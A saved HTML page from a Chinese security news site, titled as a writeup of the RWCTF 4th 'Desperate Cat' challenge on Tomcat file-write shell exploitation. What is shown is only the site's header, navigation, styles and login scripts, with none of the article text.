<!DOCTYPE html>
<!-- saved from url=(0039)https://www.anquanke.com/post/id/267124 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0,minimum-scale=1.0">
            <title>RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台</title>
                <meta name="description" content="在 Real World CTF 4th 中，我很荣幸再次作为出题人参与出题。我出了一道名叫Desperate Cat 的题目，考察的是在严苛条件下 Tomcat Web 目录写文件 getshell 的利用。">
                <meta name="keywords" content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议">
        <meta name="csrf-token" content="15R715Uwp7OwiJdzeq5ZakkJ0uNVBJmq0LuZ2TM0">
    <link rel="stylesheet" href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/bootstrap.min.css">
    <link rel="stylesheet" href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/style.css">
    <link rel="shortcut icon" href="https://p0.ssl.qhimg.com/t01b2a1553a7bc927cb.ico?v=1.2">
    <link href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/font-awesome.min.css" rel="stylesheet">
    <script src="https://zz.bdstatic.com/linksubmit/push.js"></script><script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/jquery.min.js.下载"></script>
    <script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/bootstrap.min.js.下载"></script>
    <script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/axios.min.js.下载"></script>
    <script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/purl.min.js.下载"></script>
    <script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/handlebars.min.js.下载"></script>
    <script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/jquery.lazyload.min.js.下载"></script>
    <script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/site.min.js.下载"></script>
    <script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/xss.min.js.下载"></script>
    <script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/jquery.sticky.min.js.下载"></script>
    <script type="text/javascript">
    </script>
<script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/jquery.mousewheel.min.js.下载"></script><link rel="stylesheet" href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/layer.css" id="layuicss-layer"><style type="text/css">.highslide img {cursor: url(https://static.anquanke.com/highslide/zoomin.cur), pointer !important;}.highslide-viewport-size {position: fixed; width: 100%; height: 100%; left: 0; top: 0}</style><script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/share.js.下载"></script><link rel="stylesheet" href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/share_style0_16.css"><style type="text/css">.highslide img {cursor: url(https://static.anquanke.com/highslide/zoomin.cur), pointer !important;}.highslide-viewport-size {position: fixed; width: 100%; height: 100%; left: 0; top: 0}</style></head><body data-spy="scroll" data-target="#article-index" data-offset="30">
<!--头部导航 -->
<header>
    <div class="navbar navbar-dark bg-dark header-navbar fixed-top" style="z-index:100;">

        <div class="container d-flex justify-content-between">
            <nav class="navbar navbar-expand-lg navbar-dark bg-dark header-navbar">
                <a href="https://www.anquanke.com/" class="navbar-brand">
                    <img style="height: 36px;width: 110px" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/logo.svg">
                </a>
                <div class="collapse navbar-collapse header-height" style="margin-left:35px;">
                    <!--导航菜单-->
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item active header-menu-item">
                            <a class="nav-link" href="https://www.anquanke.com/">首页</a>
                        </li>
                        <li class="nav-item dropdown header-menu-item header-nav-item-post">
                            <a class="nav-link dropdown-toggle" href="https://www.anquanke.com/post/id/267124#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                文章
                            </a>
                            <div class="header-pop-window-wrapper" style="visibility: hidden;">
                                <div class="header-pop-window" style="transform: translate(0px, -100%);">
                                    <div style="background-color:white;width: 100%;padding-bottom: 15px;">
                                        <div class="header-pop-menu-container">
                                            <div class="row">
                                                <div class="col col-8">
                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>文章分类
                                                    </div>
                                                    <div style="line-height:1.8;font-weight:normal;">
                                                        <a href="https://www.anquanke.com/knowledge">安全知识</a><span class="seprator">|</span>
                                                        <a href="https://www.anquanke.com/news">安全资讯</a><span class="seprator">|</span>
                                                        <a href="https://www.anquanke.com/activity">安全活动</a><span class="seprator">|</span>
                                                        <a href="https://www.anquanke.com/tool">安全工具</a><span class="seprator">|</span><br>
                                                        <a href="https://www.anquanke.com/job">招聘信息</a>
                                                    </div>
                                                </div>
                                                <div class="col col-6">
                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>内容精选
                                                    </div>
                                                    <div style="line-height:1.8;font-weight:normal;">
                                                        <a href="https://www.anquanke.com/week-list">360网络安全周报</a><span class="seprator">|</span>
                                                        <a href="https://www.anquanke.com/discovery" style="color:red !important;font-weight:bold">安全客季刊</a>
                                                        <span class="seprator">|</span>
                                                        <br>
                                                        <a href="https://www.anquanke.com/subject-list">专题列表</a>
                                                    </div>
                                                </div>
                                                <div class="col col-10">
                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>热门标签
                                                    </div>
                                                    <div style="line-height:1.8;font-weight:normal;">
                                                                                                                    <a href="https://www.anquanke.com/tag/%E6%B4%BB%E5%8A%A8">
                                                                <nobr>活动</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="https://www.anquanke.com/tag/CTF">
                                                                <nobr>CTF</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="https://www.anquanke.com/tag/%E5%AE%89%E5%85%A8%E6%B4%BB%E5%8A%A8">
                                                                <nobr>安全活动</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="https://www.anquanke.com/tag/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6">
                                                                <nobr>恶意软件</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="https://www.anquanke.com/tag/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E7%83%AD%E7%82%B9">
                                                                <nobr>每日安全热点</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="https://www.anquanke.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%83%AD%E7%82%B9">
                                                                <nobr>网络安全热点</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="https://www.anquanke.com/tag/Web%E5%AE%89%E5%85%A8">
                                                                <nobr>Web安全</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="https://www.anquanke.com/tag/%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6">
                                                                <nobr>漏洞预警</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="https://www.anquanke.com/tag/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">
                                                                <nobr>渗透测试</nobr>
                                                            </a><span class="seprator">|</span>                                                             <a href="https://www.anquanke.com/tag/Pwn">
                                                                <nobr>Pwn</nobr>
                                                            </a><span class="seprator">|</span>                                                     </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </li>
                    
                        <li class="nav-item header-menu-item">
                            <a class="nav-link" href="https://www.anquanke.com/src">SRC导航</a>
                        </li>
                                                    <li class="nav-item header-menu-item" style="position: relative">
                                <img class="new-module-icon" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/new.svg" alt="">
                                <a class="nav-link" href="https://www.anquanke.com/job-list">招聘</a>
                            </li>
                                                <li class="nav-item header-menu-item">
                            <a class="nav-link" href="https://www.anquanke.com/discovery">内容精选</a>
                        </li>
                    </ul>
                    <!--搜索-->

                </div>
            </nav>
            <div class="hide-in-mobile-device">
                <div class="header-height" style="float: left;">
                    <fieldset>
                        <div class="search-form" style="display: flex;position: relative;align-items: center; width: 160px;height: 28px;border-radius: 3px;margin-top: 16px;background: rgba(255,255,255,0.3);">
                            <input class="search-input" placeholder="输入关键词搜索" name="s" id="search" value="" type="text">
                            <img class="search-icon" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t010133a1346bd31419.png" alt="" onclick="if($(&#39;#search&#39;).val())window.location.href = &#39;/search?s=&#39; + $(&#39;#search&#39;).val();">
                        </div>
                    </fieldset>
                </div>
                <div class="header-height" style="float: left;position: relative">
                    <img class="app-qrcode" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01103704213901dd1e.png" alt="" style="display: none;">
                    <a href="https://www.anquanke.com/app" class="nav-a" style="" id="app-logo">
                        <img src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t0161d2c7f7fe89cb91.png" style="height:25px;width: 25px ">
                    </a>
                    <!--投稿按钮-->
                </div>
                <div class="header-height flex-align-center" style="float: left;">
                    <div class="flex-align-center" onclick="if(getLocalUserInfo()){if(getLocalUserInfo().isLogin)window.location.href=&#39;/contribute/new&#39;;else window.location.href=&#39;/login&#39;;}" style="margin: 0 6px;width: 93px;height: 28px;border-radius: 3px;background-repeat:no-repeat;background-size:93px 28px;background-image: url(&#39;https://p0.ssl.qhimg.com/t0109289cf085c07c09.png&#39;)">
                        <span class="contribution-span"><img class="contribution-icon" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01e18bc83d1362b57e.png" alt="投稿">投稿</span>
                    </div>
                </div>
                <div id="login-button" class="hide-in-mobile-device" style="float: left;">

                    <a href="https://www.anquanke.com/login" class="nav-a">
                        <div class="flex-align-center" style="width: 55px;height: 28px;border-radius: 3px;background-repeat:no-repeat;background-size:55px 28px;background-image: url(&#39;https://p0.ssl.qhimg.com/t01f944ea739c7785ca.png&#39;)">
                        <span class="contribution-span">登录</span>
                        </div>
                    </a>
                    <a href="https://www.anquanke.com/register" class="nav-a">
                        <div class="flex-align-center" style="width: 55px;height: 28px;border-radius: 3px;background-repeat:no-repeat;background-size:55px 28px;background-image: url(&#39;https://p0.ssl.qhimg.com/t01f944ea739c7785ca.png&#39;)">
                        <span class="contribution-span">注册</span>
                        </div>
                    </a>
                </div>
                <div id="navigation-user-info" class="hide-in-mobile-device" style="display:none;float: left;">
                    <a style="position: relative;">
                        <img class="avatar" id="user-avatar" style="width:40px;height:40px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC">
                        <div class="msg-count-icon unread_count" style="display: none"><span class="msg-count-container unread_count_span"></span></div>
                    </a>

                    <div class="user-opition-menu">
                        <div class="row" id="user-option-menu-corner"></div>
                        <ul>
                            <li>
                                <a id="my-home-page" href="https://www.anquanke.com/post/id/267124#">
                                    <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                        <title>主页2</title>
                                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                            <g id="个人账户" transform="translate(-1439.000000, -74.000000)" fill-rule="nonzero">
                                                <g id="编组-2" transform="translate(1424.000000, 57.000000)">
                                                    <g id="主页2" transform="translate(15.000000, 17.000000)">
                                                        <rect id="矩形" fill="#000000" opacity="0" x="0" y="0" width="20" height="20"></rect>
                                                        <path d="M18.5722656,8.46679688 L10.5039062,2.22070313 L10.3847656,2.0703125 C10.2265625,1.86914063 9.93359375,1.83398438 9.73242187,1.9921875 L9.69335937,2.02148438 C9.6796875,2.02929688 9.66601562,2.0390625 9.65429687,2.05078125 L1.42578125,8.49414063 C1.22460937,8.65234375 1.18945312,8.9453125 1.34765625,9.14648438 L1.4921875,9.33007813 C1.65039062,9.53125 1.94335937,9.56640625 2.14453125,9.40820313 L3.50390625,8.34375 L3.50390625,16.25 C3.50390625,17.2734375 4.33398438,18.1035156 5.35742188,18.1035156 L14.6347656,18.1035156 C15.6582031,18.1035156 16.4882812,17.2753906 16.4882812,16.25 L16.4882812,8.3125 L17.8535156,9.37109375 C18.0546875,9.52734375 18.3476562,9.4921875 18.5058594,9.29296875 L18.6503906,9.11132813 C18.8085938,8.91210938 18.7734375,8.62304688 18.5722656,8.46679688 L18.5722656,8.46679688 Z M15.3300781,15.7910156 L15.296875,15.7910156 C15.3164062,15.8652344 15.3300781,15.9414062 15.3300781,16.0234375 C15.3300781,16.5371094 14.9140625,16.9511719 14.4023438,16.9511719 L5.59179688,16.9511719 C5.078125,16.9511719 4.6640625,16.5351562 4.6640625,16.0234375 C4.6640625,15.9414062 4.67773438,15.8652344 4.69726562,15.7910156 L4.6640625,15.7910156 L4.6640625,7.4375 L9.97851562,3.27539062 L15.3300781,7.41796875 L15.3300781,15.7910156 Z M11.3886719,10.2226562 L8.60546875,10.2226562 C8.09179688,10.2226562 7.67773437,10.6386719 7.67773437,11.1503906 L7.67773437,13.9335937 C7.67773437,14.4472656 8.09375,14.8613281 8.60546875,14.8613281 L11.3886719,14.8613281 C11.9023438,14.8613281 12.3164062,14.4453125 12.3164062,13.9335937 L12.3164062,11.1503906 C12.3144531,10.6386719 11.9003906,10.2226562 11.3886719,10.2226562 Z M11.3886719,13.7011719 C11.3886719,13.828125 11.2851562,13.9335938 11.15625,13.9335938 L8.83789062,13.9335938 C8.7109375,13.9335938 8.60546875,13.8300781 8.60546875,13.7011719 L8.60546875,11.3828125 C8.60546875,11.2558594 8.70898438,11.1503906 8.83789062,11.1503906 L11.15625,11.1503906 C11.2832031,11.1503906 11.3886719,11.2539062 11.3886719,11.3828125 L11.3886719,13.7011719 Z" id="形状" fill="#585858"></path>
                                                    </g>
                                                </g>
                                            </g>
                                        </g>
                                    </svg>
                                    个人主页</a>
                            </li>
                            <li style="">
                                <a id="my-home-page" href="https://www.anquanke.com/setting?p=message" style="vertical-align: middle;">
                                    <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                        <title>消息</title>
                                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                            <g id="个人账户" transform="translate(-420.000000, -458.000000)" fill-rule="nonzero">
                                                <g id="消息" transform="translate(420.000000, 458.000000)">
                                                    <rect id="矩形" fill="#000000" opacity="0" x="0" y="0" width="20" height="20"></rect>
                                                    <g id="编组" transform="translate(2.500000, 1.250000)" fill="#585858">
                                                        <path d="M14.7831453,0 L0.613917989,0 C0.274860446,0 -1.01030295e-13,0.274860446 -1.01030295e-13,0.613917989 L-1.01030295e-13,13.0150614 C-1.01030295e-13,13.1778826 0.0646804531,13.3340351 0.17981241,13.449167 C0.294944367,13.564299 0.451096812,13.6289795 0.613917989,13.6289795 L6.07164895,13.6289795 L6.07164895,12.4011435 L1.23397516,12.4011435 L1.23397516,1.22783598 L14.1692273,1.22783598 L14.1692273,12.3950043 L12.0941845,12.3950043 C11.971743,12.3947309 11.8520167,12.4310763 11.7503904,12.4993703 L5.96114371,16.3854712 L6.64873187,17.4107143 L12.284499,13.6289795 L14.7831453,13.6289795 C14.9459665,13.6289795 15.1021189,13.564299 15.2172509,13.449167 C15.3323828,13.3340351 15.3970633,13.1778826 15.3970633,13.0150614 L15.3970633,0.613917989 C15.3970633,0.274860446 15.1222028,0 14.7831453,0 Z" id="路径"></path>
                                                        <path d="M3.71420386,6.81448973 C3.71420386,7.30273259 4.1100029,7.69853163 4.59824576,7.69853163 C5.08648863,7.69853163 5.48228767,7.30273259 5.48228767,6.81448973 C5.48228767,6.32624686 5.08648863,5.93044782 4.59824576,5.93044782 C4.1100029,5.93044782 3.71420386,6.32624686 3.71420386,6.81448973 Z" id="路径"></path>
                                                        <path d="M6.81448973,6.81448973 C6.81448973,7.30273259 7.21028877,7.69853163 7.69853163,7.69853163 C8.1867745,7.69853163 8.58257354,7.30273259 8.58257354,6.81448973 C8.58257354,6.32624686 8.1867745,5.93044782 7.69853163,5.93044782 C7.21028877,5.93044782 6.81448973,6.32624686 6.81448973,6.81448973 L6.81448973,6.81448973 Z" id="路径"></path>
                                                        <path d="M9.9147756,6.81448973 C9.9147756,7.30273259 10.3105746,7.69853163 10.7988175,7.69853163 C11.2870604,7.69853163 11.6828594,7.30273259 11.6828594,6.81448973 C11.6828594,6.32624686 11.2870604,5.93044782 10.7988175,5.93044782 C10.3105746,5.93044782 9.9147756,6.32624686 9.9147756,6.81448973 Z" id="路径"></path>
                                                    </g>
                                                </g>
                                            </g>
                                        </g>
                                    </svg>
                                    我的消息</a>
                                <div class="drop-msg-count-icon unread_count" style="display: none"><span class="drop-msg-count-container unread_count_span"></span></div>
                            </li>
                            <li>
                                <a href="https://www.anquanke.com/setting">
                                    <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                        <title>设置</title>
                                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                            <g id="个人账户" transform="translate(-420.000000, -294.000000)" fill-rule="nonzero">
                                                <g id="设置" transform="translate(420.000000, 294.000000)">
                                                    <rect id="矩形" fill="#000000" opacity="0" x="0" y="0" width="20" height="20"></rect>
                                                    <path d="M4.36479372,5.04181819 L3.37724827,6.75181819 L4.55665735,7.43295456 L4.37052099,8.30554546 C4.28234797,8.72001599 4.23805838,9.14261819 4.23838464,9.56636363 C4.23838464,9.99468181 4.28297554,10.4160455 4.37052099,10.8267727 L4.55665735,11.6997727 L3.37724827,12.3805 L4.36479372,14.0909091 L5.54297554,13.411 L6.20652099,14.0135909 C6.84051607,14.5908455 7.59086683,15.025516 8.40702099,15.2883182 L9.25874827,15.5615909 L9.25874827,16.9054546 L11.2338392,16.9054546 L11.2338392,15.5615909 L12.0855664,15.2883182 C12.901866,15.0255691 13.652361,14.5908957 14.2864755,14.0135909 L14.9492028,13.411 L16.1277937,14.0909091 L17.1153392,12.3809091 L15.9359301,11.6997727 L16.1220664,10.8267727 C16.2096119,10.4160455 16.2542028,9.99468183 16.2542028,9.56636363 C16.2542028,9.13804546 16.2096119,8.71627273 16.1220664,8.30554546 L15.9359301,7.43295456 L17.1153392,6.75181819 L16.1277937,5.04181819 L14.9496119,5.72213637 L14.2860664,5.11913637 C13.6520332,4.54202878 12.9016852,4.10749932 12.0855664,3.84481819 L11.2338392,3.57113637 L11.2338392,2.22727273 L9.25874827,2.22727273 L9.25874827,3.57113637 L8.40702099,3.84481819 C7.59075682,4.10744631 6.84026454,4.54197855 6.20611191,5.11913637 L5.54338464,5.72213637 L4.36479372,5.0414091 L4.36479372,5.04181819 Z M8.03147554,1.82104546 C8.03147554,1.36777273 8.39393008,1 8.84924827,1 L11.6433392,1 C12.0949755,1 12.4611119,1.36736363 12.4611119,1.82104546 L12.4611119,2.67604546 C13.444298,2.99252969 14.3482346,3.51605965 15.112021,4.21136363 L15.8659755,3.77568183 C16.0537884,3.66590485 16.2776283,3.63556853 16.487885,3.69139638 C16.6981418,3.74722423 16.877449,3.88460511 16.9860664,4.07309092 L18.3831119,6.49286363 C18.6089301,6.88395454 18.473521,7.38468181 18.0807937,7.61172727 L17.3223392,8.04945456 C17.4266574,8.53872729 17.4818846,9.04600002 17.4818846,9.56636363 C17.4818846,10.0863182 17.4266574,10.594 17.3223392,11.0828636 L18.0807937,11.5205909 C18.473521,11.7476364 18.6105664,12.2450909 18.3831119,12.6394546 L16.9860664,15.0592273 C16.8771288,15.2473641 16.6978594,15.384469 16.487759,15.4403321 C16.2776585,15.4961952 16.0539679,15.4662323 15.8659755,15.3570455 L15.1116119,14.9213636 C14.3477874,15.6165207 13.4438536,16.1399095 12.4607028,16.4562727 L12.4607028,17.3112727 C12.4617917,17.5287214 12.3761447,17.7376318 12.2227293,17.8917383 C12.0693139,18.0458448 11.8607905,18.1323183 11.6433392,18.1323183 L8.84924827,18.1323183 C8.63189385,18.1319932 8.42358291,18.0452815 8.27019718,17.8912819 C8.11681145,17.7372823 8.03093245,17.5286267 8.03147554,17.3112727 L8.03147554,16.4562727 C7.04832477,16.1399095 6.14439092,15.6165207 5.38056645,14.9213636 L4.62661191,15.3570455 C4.43874933,15.4667885 4.214872,15.4970625 4.00460935,15.4411563 C3.7943467,15.3852501 3.61506979,15.2477824 3.50652099,15.0592273 L2.10988464,12.6394546 C2.00159092,12.4510637 1.97260377,12.2273587 2.0293047,12.0175882 C2.08600564,11.8078178 2.22374622,11.6291793 2.41220281,11.521 L3.17065735,11.0832727 C3.06452882,10.5846216 3.01118943,10.0761833 3.01152099,9.56636363 C3.01152099,9.046 3.06633916,8.53872727 3.17106645,8.04945456 L2.41220281,7.61172727 C2.22321861,7.50393731 2.08503553,7.32521826 2.02828489,7.11518714 C1.97153425,6.90515602 2.00090434,6.68116393 2.10988464,6.49286363 L3.50693008,4.07309092 C3.61593611,3.88502343 3.79523567,3.74800519 4.00533029,3.69222039 C4.21542491,3.63643558 4.43907825,3.66646085 4.62702099,3.77568183 L5.38097554,4.21136363 C6.14480002,3.51620661 7.04873387,2.99281776 8.03188464,2.67645456 L8.03188464,1.82104546 L8.03147554,1.82104546 Z M10.2671574,13.0354546 C9.02777053,13.0354546 7.88252987,12.3742496 7.26283645,11.3009091 C6.64314303,10.2275686 6.64314303,8.90515864 7.26283645,7.83181817 C7.88252987,6.7584777 9.02777053,6.09727273 10.2671574,6.09727273 C12.1830833,6.09727273 13.7362482,7.65043767 13.7362482,9.56636364 C13.7362482,11.4822896 12.1830833,13.0354546 10.2671574,13.0354546 Z M10.2671574,11.8081818 C11.5052793,11.8081818 12.5089755,10.8044856 12.5089755,9.56636364 C12.5089755,8.32824165 11.5052793,7.32454546 10.2671574,7.32454546 C9.02903536,7.32454546 8.02533917,8.32824165 8.02533917,9.56636364 C8.02533917,10.8044856 9.02903536,11.8081818 10.2671574,11.8081818 L10.2671574,11.8081818 Z" id="形状" fill="#585858"></path>
                                                </g>
                                            </g>
                                        </g>
                                    </svg>
                                    个人设置</a>
                            </li>
                            <li onclick="logout();">
                                <a href="javascript:void(0)">
                                <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                    <title>关闭</title>
                                    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                        <g id="个人账户" transform="translate(-1439.000000, -179.000000)" fill-rule="nonzero">
                                            <g id="编组-2" transform="translate(1424.000000, 57.000000)">
                                                <g id="关闭" transform="translate(15.000000, 122.000000)">
                                                    <rect id="矩形" fill="#000000" opacity="0" x="0" y="0" width="20" height="20"></rect>
                                                    <path d="M10,17.6136364 C8.98780811,17.6136364 8.00563212,17.4264953 7.08030745,17.0580203 C6.63422082,16.880037 6.20749621,16.6617147 5.80612245,16.4061174 C5.40798713,16.1525556 5.0364973,15.8636914 4.69672674,15.5434701 C4.35692855,15.2232748 4.05040451,14.8731877 3.78134111,14.4979902 C3.51014701,14.1197559 3.27854206,13.7176128 3.08978267,13.2972151 C2.69858203,12.4252013 2.5,11.4996116 2.5,10.5457354 C2.5,9.59185909 2.69858203,8.6662694 3.08978267,7.79425564 C3.27763053,7.37520199 3.51040286,6.97132193 3.78134111,6.59348052 C4.05040451,6.21828305 4.35692855,5.86819594 4.69672674,5.54800065 C4.98953088,5.27187857 5.46441823,5.27187857 5.75742115,5.54800065 C6.05022528,5.8239354 6.05022528,6.27146298 5.75742115,6.54758506 C5.20600318,7.06704675 4.77345614,7.67174286 4.47111052,8.34500118 C4.15862709,9.04186287 4,9.78199743 4,10.5457354 C4,11.309286 4.15862709,12.0497952 4.47111052,12.7464696 C4.77345614,13.4195405 5.20600318,14.024424 5.75742115,14.5438857 C6.30864034,15.0635347 6.9503048,15.4711613 7.66472303,15.7560878 C8.40418765,16.0505681 9.18976941,16.2000562 10,16.2000562 C10.8102306,16.2000562 11.5960111,16.0505681 12.335277,15.7560878 C13.0494964,15.4711613 13.6913597,15.0635347 14.2425788,14.5438857 C14.7939968,14.024424 15.2265439,13.4197279 15.5288895,12.7464696 C15.8413729,12.0496079 16,11.309286 16,10.5457354 C16,9.78199743 15.8413729,9.04167554 15.5288895,8.34500118 C15.2265439,7.67193019 14.7939968,7.06704675 14.2425788,6.54739773 C13.9497747,6.27146298 13.9497747,5.8239354 14.2425788,5.54800065 C14.5355818,5.27187857 15.0102703,5.27187857 15.3032733,5.54800065 C15.6430715,5.86819594 15.9495955,6.21828305 16.2186589,6.59348052 C16.4897783,6.97175757 16.7213792,7.37389366 16.9102173,7.79425564 C17.301418,8.6662694 17.5,9.59185909 17.5,10.5457354 C17.5,11.4996116 17.301418,12.4252013 16.9102173,13.2972151 C16.721422,13.7175965 16.4898189,14.1197364 16.2186589,14.4979902 C15.9495955,14.8731877 15.6430715,15.2232748 15.3032733,15.5434701 C14.9635027,15.8636914 14.5920129,16.1525556 14.1938776,16.4061174 C13.7924792,16.6616765 13.3657586,16.8799968 12.9196926,17.0580203 C11.9943679,17.4266826 11.0121919,17.6136364 10,17.6136364 L10,17.6136364 Z M10.6818182,10 L10.6818182,2.04545455 C10.6818182,1.60608872 10.3765993,1.25 10,1.25 C9.62340072,1.25 9.31818182,1.60608872 9.31818182,2.04545455 L9.31818182,10 C9.31818182,10.4393658 9.62340072,10.7954545 10,10.7954545 C10.3765993,10.7954545 10.6818182,10.4393658 10.6818182,10 Z" id="形状" fill="#585858"></path>
                                                </g>
                                            </g>
                                        </g>
                                    </g>
                                </svg>
                                退出登录</a>
                            </li>
                        </ul>
                    </div>

                </div>
            </div>

            <div class="show-in-mobile-device" onclick="switchMobileMenu()" style="width: 40px;height: 60px;line-height: 60px; cursor: pointer;font-size: 28px;color: white">
                <i class="fa fa-bars"></i>
            </div>
        </div>
    </div>
</header>
<style>
    #mobile-menu {
        position: fixed;
        width: 100%;
        top: 60px;
        left: 0;
        background: #1dada7;
        height: 0;
        z-index: 50;
        overflow: hidden;
        box-shadow: 0 0 3rem #444;
    }

    #mobile-menu ul {
        padding: 0px;
    }

    #mobile-menu li {
        color: rgba(255, 255, 255, 0.7);
        font-size: 0.9rem;
        margin-top: 20px;
        padding-left: 12px;
    }
    .new-module-icon {
        position: absolute;
        top: 10px;
        right: -15px;
    }
    .online-alter-notice {
        display: none;
        position: absolute;
        white-space: nowrap;
        background: rgba(255,255,255,1);
        box-shadow: 2px 2px 4px 0px rgba(160,160,160,0.5);
        border: 1px solid rgba(230,234,241,1);
    }
    .online-notice-content {
        align-items: center;
        padding: 15px 20px 15px 15px;
        line-height: 30px;
        font-size: 16px;
        font-weight: 400;
    }
    .online-notice-content img {
        width: 16px;
        height: 16px;
        margin-right: 5px;
    }
    .alert-corner {
        display: none;
        width: 10px;
        height: 10px;
        background:  rgba(255,255,255,1);
        transform: rotate(45deg);
        position: absolute;
        left: 30px;
        bottom: -5px;
        z-index: 1;
    }
</style>
<div id="mobile-menu" class="show-in-mobile-device">
    <ul>
        <li class="mobile-menu-item" data-url="/">首页</li>
        <li class="mobile-menu-item" data-url="/knowledge">安全知识</li>
        <li class="mobile-menu-item" data-url="/news">安全资讯</li>
        <li class="mobile-menu-item" data-url="/job">招聘信息</li>
        <li class="mobile-menu-item" data-url="/activity">安全活动</li>
        <li class="mobile-menu-item" data-url="/app">APP下载</li>
    </ul>
</div>
<script>
    var menuExpand = false;

    function switchMobileMenu() {
        if (!menuExpand) {
            $("#mobile-menu").animate({"height": "265px"});
            menuExpand = true;
        }
        else {
            $("#mobile-menu").animate({"height": "0px"});
            menuExpand = false;
        }
    }

    $(".mobile-menu-item").click(function () {
        window.location.href = $(this).data("url");
    });
</script>

<script>
    var status;

    function updateLoginStatus(status) {
        if (status.isLogin) {
            $("#navigation-user-info").show();
            $("#user-avatar").attr("src", getResizedQihooImg(status.user.avatar, 90, 90));
            $("#my-home-page").attr("href", "/member/" + status.user.id);
            $(".comment-login").show();
            $(".comment-login .avatar").attr("data-original", getResizedQihooImg(status.user.avatar, 90, 90));
            $(".comment-login .avatar").lazyload();
            $(".comment-login a").attr("href", "/member/" + status.user.id);
            $(".comment-login .nickname").text(status.user.nickname);
            $(".comment-not-login").hide();
        }
        else {
            $("#login-button").show();
            $(".comment-login").hide();
            $(".comment-not-login").show();
        }
    }

    function getMessageCount() {
        axios.post(api("msg/user/unread")).then(function (res) {
            if(res.data.code==0)
            {
                if(res.data.unread_count>0)
                {
                    $(".unread_count").show();
                    if (res.data.unread_count > 99) {
                        $(".unread_count_span").css('top','-3px');
                        $(".unread_count_span").text('...');

                    } else {
                        $(".unread_count_span").text(res.data.unread_count);
                    }
                }

            }
            console.log(res.data);
        });
    }
    getMessageCount();

    function logout() {
        axios.post(api("user/logout")).then(function (res) {
            deleteUserInfo();
            window.location.href = "/";

        });
    }

    $(".header-nav-item-post").hover(
        function () {
            $(".header-pop-window-wrapper").css("visibility", "visible");
            $(".header-pop-window").css("transform", "translate(0,0)");
